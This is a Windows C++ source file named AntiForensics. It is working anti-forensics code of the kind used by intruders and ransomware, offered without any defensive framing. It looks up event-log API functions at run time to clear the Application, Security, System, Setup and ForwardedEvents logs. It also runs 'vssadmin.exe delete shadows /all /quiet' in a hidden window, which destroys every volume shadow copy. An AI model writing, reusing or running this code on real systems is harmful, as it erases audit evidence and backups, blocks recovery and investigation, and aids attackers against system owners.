#include "AntiForensics.h"

#include <windows.h>

#include <string>

namespace forensics {

namespace {

using ClearEventLogA_t = BOOL(WINAPI*)(HANDLE, LPCSTR);
using OpenEventLogA_t = HANDLE(WINAPI*)(LPCSTR, LPCSTR);
using CloseEventLog_t = BOOL(WINAPI*)(HANDLE);

template <typename T>
T get_proc(const char* name) {
    HMODULE h = GetModuleHandleA("advapi32.dll");
    if (!h) return nullptr;
    return reinterpret_cast<T>(GetProcAddress(h, name));
}

std::string run_cmd(const wchar_t* cmdline) {
    STARTUPINFOW si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    std::wstring mut(cmdline);
    if (!CreateProcessW(nullptr, mut.data(), nullptr, nullptr, FALSE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        return "spawn failed " + std::to_string(GetLastError());
    }
    WaitForSingleObject(pi.hProcess, 30000);
    DWORD code = 1;
    GetExitCodeProcess(pi.hProcess, &code);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return code == 0 ? "ok" : ("exit " + std::to_string(code));
}

} // namespace

std::string run(bool clear_logs, bool wipe_vss) {
    std::string out;
    if (clear_logs) {
        auto OpenEventLogA_ = get_proc<OpenEventLogA_t>("OpenEventLogA");
        auto ClearEventLogA_ = get_proc<ClearEventLogA_t>("ClearEventLogA");
        auto CloseEventLog_ = get_proc<CloseEventLog_t>("CloseEventLog");
        if (!OpenEventLogA_ || !ClearEventLogA_ || !CloseEventLog_) {
            out += "resolve error; ";
        } else {
            const char* logs[] = { "Application", "Security", "System", "Setup", "ForwardedEvents" };
            for (const char* n : logs) {
                HANDLE h = OpenEventLogA_(nullptr, n);
                if (h) {
                    if (ClearEventLogA_(h, nullptr)) out += std::string(n) + " cleared; ";
                    else out += std::string(n) + " failed; ";
                    CloseEventLog_(h);
                }
            }
        }
    }
    if (wipe_vss) {
        out += "vss: " + run_cmd(L"vssadmin.exe delete shadows /all /quiet") + "; ";
    }
    return out;
}

} // namespace forensics
